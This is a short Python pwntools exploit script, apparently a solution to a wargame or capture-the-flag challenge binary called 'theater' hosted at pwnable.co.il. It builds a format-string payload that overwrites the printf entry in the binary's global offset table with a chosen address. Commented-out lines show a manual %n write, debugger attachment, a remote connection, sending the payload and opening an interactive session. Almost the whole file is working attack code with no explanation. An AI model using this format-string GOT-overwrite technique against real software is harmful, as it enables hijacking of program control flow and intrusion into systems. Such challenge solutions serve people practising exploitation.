import pwn

elf = pwn.ELF('./theater')
pwn.context.binary = elf
pwn.context.log_level = 'DEBUG'
libc = elf.libc

# value = str(0x000000401316 - 8).encode()
# message = pwn.p64(0x00007ffd6b16cef8) + b'%' + value + b'x' + b'%1$n'


# p = elf.process()
# pwn.gdb.attach(p)

# p = pwn.remote('pwnable.co.il', 9011)
payload = pwn.fmtstr_payload(6, {elf.got['printf'] : 0x0000000000401316})
print(payload)
# p.recv()
# p.sendline(payload)

# p.clean()

# p.interactive()